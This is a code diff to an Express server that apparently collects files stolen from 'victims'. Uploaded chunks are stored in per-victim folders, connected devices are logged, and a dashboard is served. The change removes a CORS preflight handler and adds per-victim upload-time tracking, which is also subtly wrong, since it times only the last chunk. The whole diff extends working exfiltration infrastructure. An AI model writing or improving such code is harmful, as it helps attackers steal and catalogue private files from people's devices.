@@ -22,15 +22,6 @@ app.use((req, res, next) => {
   next();
 });
 
-// Handle OPTIONS requests for /upload
-app.options('/upload', (req, res) => {
-  res.header('Access-Control-Allow-Origin', corsOptions.origin);
-  res.header('Access-Control-Allow-Methods', corsOptions.methods.join(', '));
-  res.header('Access-Control-Allow-Headers', corsOptions.allowedHeaders.join(', '));
-  res.header('Access-Control-Allow-Credentials', 'true');
-  res.status(204).end();
-});
-
 // Serve the dashboard as static files
 app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));
 
@@ -89,6 +80,7 @@ app.post('/upload', (req, res) => {
         connectionTime: Date.now(),  // Record connection time in milliseconds
         lastConnectionTime: new Date(),
         filesTransferred: 0,
+        totalUploadTime: 0, // Initialize total upload time
         fileList: [],
       };
     } else {
@@ -105,6 +97,9 @@ app.post('/upload', (req, res) => {
 
     const victimFolder = victimFolders[victimId];
     const filePath = path.join(victimFolder, filename);
+
+    // Track the start time for the file upload
+    const startTime = Date.now();
 
     fs.appendFile(filePath, req.body, (err) => {
       if (err) {
@@ -123,6 +118,11 @@ app.post('/upload', (req, res) => {
 
       if (victimFileCounts[victimId] === totalChunks) {
         console.log(`✅ File upload complete: ${filename}`);
+
+        // Calculate total upload time once all chunks are received
+        const endTime = Date.now();
+        const uploadDuration = (endTime - startTime) / 1000; // in seconds
+        connectedDevices[victimId].totalUploadTime += uploadDuration;
       }
 
       res.status(200).json({ message: 'Chunk received successfully' });
